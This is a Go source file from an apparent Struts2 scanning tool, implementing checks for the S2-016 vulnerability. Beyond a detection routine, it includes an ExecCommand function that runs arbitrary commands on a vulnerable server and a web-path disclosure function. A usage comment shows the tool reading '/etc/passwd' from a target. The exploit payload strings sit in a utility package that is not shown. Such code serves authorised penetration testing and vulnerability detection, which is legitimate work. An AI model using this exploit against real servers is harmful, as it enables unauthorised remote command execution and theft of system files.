package s2_016

import (
    "fmt"
    "github.com/fatih/color"
    "github.com/yhy0/ChYing/pkg/Jie/scan/Pocs/java/struts2/utils"
)

/*
ST2SG.exe --url http://192.168.123.128:8080/S2-016/default.action --vn 16 --mode exec --cmd "cat /etc/passwd"
*/
func Check(targetUrl string) {
    // s016的目的url必须带action，比如：http://xxx.com/xxx.action
    // respString := utils.GetFunc4Struts2(targetUrl,"",utils.POC_s016_check)
    headerLocation := utils.Get302Location(targetUrl + utils.POC_s016_check)
    // fmt.Println(headerLocation)
    if utils.IfContainsStr(headerLocation, "6308") {
        color.Red("*Found Struts2-016！")
    } else {
        fmt.Println("Struts2-016 Not Vulnerable.")
    }
}
func GetWebPath(targeturl string) {
    webpath := utils.GetFunc4Struts2(targeturl, "", utils.POC_s016_webpath)
    color.Green(webpath)
}
func ExecCommand(targetUrl string, command string) {
    respString := utils.GetFunc4Struts2(targetUrl, "", utils.POC_s016_exec(command))
    fmt.Println(respString)
}
